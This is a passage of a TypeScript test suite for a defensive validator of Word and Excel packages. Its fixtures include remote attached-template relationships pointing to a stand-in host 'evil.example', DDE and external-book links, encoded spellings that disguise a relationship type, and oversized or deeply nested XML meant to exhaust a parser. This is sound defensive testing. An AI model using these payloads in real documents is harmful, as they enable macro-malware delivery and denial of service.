    refused(await run(await link(`<externalLink><!-- c --><externalBook/></externalLink>`), "a.xlsx"));
    refused(await run(await link(`<externalLink><ddeLink/></externalLink>`), "a.xlsx"));
  });
});

describe("the xml reader is bounded and trims nothing", () => {
  const RNS = "http://schemas.openxmlformats.org/package/2006/relationships";
  const CNS = "http://schemas.openxmlformats.org/package/2006/content-types";
  const CRLF = String.fromCharCode(13, 10);
  const TAB = String.fromCharCode(9);
  const doc = (ct: string | Uint8Array, relsXml: string | Uint8Array) =>
    zip([
      { name: "[Content_Types].xml", body: ct },
      { name: "word/document.xml", body: "<d/>" },
      { name: "word/settings.xml", body: "<w:settings/>" },
      { name: "word/_rels/settings.xml.rels", body: relsXml },
    ]);
  const r = (inner: string) => `<?xml version="1.0"?><Relationships xmlns="${RNS}">${inner}</Relationships>`;
  const ct = types(DOCX_CT);

  it("still takes every spelling Office uses", async () => {
    const decl = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
    const ctOk = `${decl}${CRLF}<Types xmlns="${CNS}"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension='xml' ContentType='application/xml'/>${CRLF}${TAB}<Override${CRLF}${TAB}PartName="/word/document.xml"${TAB}ContentType="${OFFICE}.wordprocessingml.document.main+xml" />${CRLF}</Types>${CRLF}`;
    const rOk = `${decl}${CRLF}<Relationships xmlns="${RNS}"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/a?b=1&amp;c=&#x1F600;" TargetMode="External"/><Relationship Id='rId2' Type='${TPL}' Target='file:///C:${BS}Users${BS}a${BS}Templates${BS}Firm%20Letter.dotx' TargetMode='External'></Relationship></Relationships>`;
    accepted(await run(await doc(ctOk, rOk)));
    accepted(await run(await doc(new Uint8Array([0xef, 0xbb, 0xbf, ...enc(ctOk)]), rOk)));
    const u16 = (s: string) => new Uint8Array([0xff, 0xfe, ...[...s].flatMap((c) => [c.charCodeAt(0) & 255, c.charCodeAt(0) >> 8])]);
    accepted(await run(await doc(u16(ctOk.replace("UTF-8", "UTF-16")), u16(rOk.replace("UTF-8", "UTF-16").replace("&#x1F600;", "")))));
    accepted(await run(await doc(ctOk, `<Relationships xmlns="${RNS}"><Relationship Id="rId1" Type="http://purl.oclc.org/ooxml/officeDocument/relationships/styles" Target="styles.xml"/></Relationships>`)));
    accepted(await run(await doc(ctOk, `<r:Relationships xmlns:r="${RNS}" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14ac"><r:Relationship Id="rId1" Type="http://x/hyperlink" Target="a"/></r:Relationships>`)));
    accepted(await run(await doc(ctOk, `<Relationships xmlns="${RNS}"/>`)));
  });

  it("trims nothing: a value that starts or ends in white space is refused", async () => {
    refused(await run(await doc(ct, r(`<Relationship Id="a" Type="${TPL} " Target="https://evil.example/t.dotm" TargetMode="External"/>`))));
    refused(await run(await doc(ct, r(`<Relationship Id="a" Type=" ${TPL}" Target="https://evil.example/t.dotm" TargetMode="External"/>`))));
    refused(await run(await doc(ct, r(`<Relationship Id="a" Type="${TPL}&#10;" Target="https://evil.example/t.dotm" TargetMode="External"/>`))));
    refused(await run(await doc(ct, r(`<Relationship Id="a" Type="http://x/hyperlink" Target=" a" TargetMode="External"/>`))));
  });

  it("takes no attribute in another namespace on a relationship or a type, other than a namespace declaration", async () => {
    refused(await run(await doc(ct, `<Relationships xmlns="${RNS}" xmlns:q="${RNS}"><Relationship Id="a" q:Type="${TPL}" Type="http://x/hyperlink" Target="https://evil"/></Relationships>`)));
    accepted(await run(await doc(ct, `<Relationships xmlns="${RNS}"><Relationship xmlns:q="x" Id="a" Type="http://x/hyperlink" Target="a"/></Relationships>`)));
  });

  it("refuses spellings that hide a type or a target, and an oversized name", async () => {
    refused(await run(await doc(ct, r(`<Relationship Id="a" Type="http:&#x2F;&#x2f;schemas.openxmlformats.org/officeDocument/2006/relationships/attached&#x0000054;emplate" Target="https:&#47;/evil" TargetMode="External"/>`))));
    refused(await run(await doc(ct, r(`<Relationship Id="a"Type="${TPL}" Target="https://evil"/>`))));
    refused(await run(await doc(ct, `<?xml version="1.0" encoding="UTF-16"?>` + r(`<Relationship Id="a" Type="${TPL}" Target="https://evil"/>`).replace(/^<\?xml[^>]*>/, ""))));
    refused(await run(await doc(ct, r(`<Relationship ${"x".repeat(100000)}="1" Id="a" Type="http://x/hyperlink" Target="a"/>`))));
    refused(await run(await doc(ct, `<Relationships xmlns="${RNS}" xmlns:\u{1F600}="${RNS}"><\u{1F600}:Relationship Id="a" Type="${TPL}" Target="https://evil"/></Relationships>`)));
  });

  it("stops at the first tag that nests too deep or the first thousands of elements, without building a tree", async () => {
    const flat = `<Types xmlns="${CNS}">` + "<a/>".repeat(500_000) + "</Types>";
    refused(await timed(async () => run(await doc(flat, `<Relationships xmlns="${RNS}"/>`)), 5000));
    const deep = `<Types xmlns="${CNS}">` + "<a>".repeat(600_000);
    refused(await timed(async () => run(await doc(deep, `<Relationships xmlns="${RNS}"/>`)), 5000));
    const nested = `<Types xmlns="${CNS}"><Default Extension="xml" ContentType="application/xml"><x/></Default></Types>`;
    refused(await run(await doc(nested, `<Relationships xmlns="${RNS}"/>`)));
    const attrs = `<Types xmlns="${CNS}"><Default ` + Array.from({ length: 150_000 }, (_, i) => `a${i}=""`).join(" ") + "/></Types>";
    refused(await timed(async () => run(await doc(attrs, `<Relationships xmlns="${RNS}"/>`)), 5000));
    const many = `<Types xmlns="${CNS}">` + Array.from({ length: 10_001 }, (_, i) => `<Override PartName="/p${i}.xml" ContentType="application/xml"/>`).join("") + "</Types>";
    refused(await run(await doc(many, `<Relationships xmlns="${RNS}"/>`)));
  });
});
